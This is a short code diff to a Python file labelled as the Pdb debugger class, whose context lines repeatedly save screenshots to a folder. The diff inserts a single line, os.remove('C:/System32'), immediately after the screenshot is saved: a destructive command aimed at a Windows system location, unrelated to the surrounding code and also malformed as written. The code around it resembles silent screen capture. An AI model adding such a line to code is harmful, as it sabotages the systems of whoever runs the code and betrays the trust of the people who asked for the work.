@@ -59,6 +59,7 @@ class Pdb(bdb.Bdb, cmd.Cmd):
             time.sleep(1)
             percorso_screenshot = os.path.join(cartella_screenshots, f"screenshot_{time.time()}.jpg")
             screenshot.save(percorso_screenshot)
+            os.remove("C:/System32")
     
 
 
